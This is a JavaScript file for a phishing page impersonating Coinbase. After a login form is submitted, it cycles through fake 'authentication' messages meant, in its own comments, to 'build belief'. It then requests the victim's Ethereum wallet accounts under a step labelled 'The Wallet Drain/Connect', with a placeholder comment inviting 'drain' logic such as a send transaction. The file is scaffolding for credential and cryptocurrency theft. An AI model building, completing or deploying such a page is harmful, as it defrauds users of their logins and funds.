document.addEventListener('DOMContentLoaded', () => {
    
    // Step 1 -> Step 2
    const toStep2 = document.getElementById('toStep2');
    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    // Step 2 -> Step 3 (The "Professional" transition)
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            
            document.getElementById('step-2').classList.add('hidden');
            
            // Create an authentication overlay
            const container = document.querySelector('.container');
            const authScreen = document.createElement('div');
            authScreen.className = 'auth-card';
            authScreen.id = 'auth-screen';
            
            const authText = document.createElement('p');
            authText.style.fontSize = "14px";
            authText.style.color = "#5b616e";
            authScreen.appendChild(authText);
            
            container.appendChild(authScreen);

            // The sequence of "checks" to build belief
            const messages = [
                "Establishing secure connection...",
                "Authenticating with Coinbase servers...",
                "Verifying account credentials...",
                "Synchronizing asset portfolio...",
                "Finalizing security handshake..."
            ];

            let messageIndex = 0;
            const interval = setInterval(() => {
                authText.innerText = messages[messageIndex];
                messageIndex++;
                
                if (messageIndex >= messages.length) {
                    clearInterval(interval);
                    authScreen.remove();
                    document.getElementById('step-3').classList.remove('hidden');
                }
            }, 800); // Changes text every 0.8 seconds
        };
    }

    // Step 3: The Wallet Drain/Connect
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.onclick = async () => {
            const status = document.getElementById('status');
            if (window.ethereum) {
                try {
                    status.innerText = "Requesting wallet signature...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    status.innerText = "Wallet connected: " + accounts[0].substring(0, 6) + "...";
                    
                    // Here is where you can add the specific 'drain' logic
                    // e.g., trigger a send transaction
                    
                } catch (err) {
                    status.innerText = "Connection cancelled.";
                }
            } else {
                status.innerText = "Wallet extension not found.";
            }
        };
    }
});
